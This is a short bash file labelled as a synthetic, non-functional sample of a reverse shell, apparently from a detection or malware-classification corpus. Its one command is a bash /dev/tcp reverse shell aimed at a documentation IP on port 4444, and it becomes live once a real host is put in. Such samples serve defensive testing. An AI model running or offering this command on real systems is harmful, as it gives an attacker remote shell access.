#!/bin/bash
# Synthetic sample - bash /dev/tcp reverse shell (NON-FUNCTIONAL, doc IP)
# Family: reverse shell
bash -i >& /dev/tcp/192.0.2.44/4444 0>&1
